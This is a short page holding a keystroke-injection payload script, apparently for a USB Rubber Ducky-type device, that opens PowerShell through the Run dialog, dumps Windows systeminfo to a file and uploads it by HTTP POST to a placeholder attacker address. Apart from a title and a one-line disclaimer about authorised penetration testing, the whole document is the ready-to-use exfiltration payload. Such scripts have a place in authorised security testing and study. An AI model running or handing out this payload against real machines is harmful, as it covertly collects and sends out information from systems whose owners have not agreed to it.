# Exfiltrating System Information to Remote Server

Collects system information and sends it to a remote server.

```
DELAY 500
GUI r
DELAY 200
STRING powershell -Command "systeminfo | Out-File 'C:\\system_info.txt'; Invoke-WebRequest -Uri 'http://attacker_ip/upload' -Method POST -InFile 'C:\\system_info.txt'"
ENTER
```

> Disclaimer: This script is for educational purposes and should only be used in environments where you have explicit authorization to perform penetration testing. Always follow ethical guidelines and laws governing cybersecurity practices.